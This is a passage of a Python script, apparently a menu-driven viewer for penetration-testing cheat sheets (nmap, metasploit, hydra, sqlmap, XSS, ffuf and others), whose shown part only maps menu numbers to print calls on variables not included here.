print('13. XSS')
print('14. OneLiner')
print('15. FFUF')
choice = input('Choose : ')

if choice == '0' :
    print(http)
elif choice == '1' :
    print(port)
elif choice == '2':
    print(nmap_cheatsheet)
elif choice == '3':
    print(windows_command_cheatsheet)
elif choice == '4':
    print(linux_command_cheatsheet)
elif choice == '5':
    print(metasploit_cheatsheet)
elif choice == '6':
    print(wifi_hacking)
elif choice == '7':
    print(netcat)
elif choice == '8':
    print(hydra)
elif choice == '9' :
    print(DirBuster)
elif choice == '10' :
    print(wireshark)
elif choice == '11' :
    print(set)
elif choice == '12' :
    print(sqlmap)
elif choice == '13' :
    print(xss)
elif choice == '14' :
    print(oneliner)
elif choice == '15' :
    print(ffuf)
else:
    print('Invalid choice.')
    sys.exit()

# Wait for 5 seconds before exiting the program
time.sleep(5)
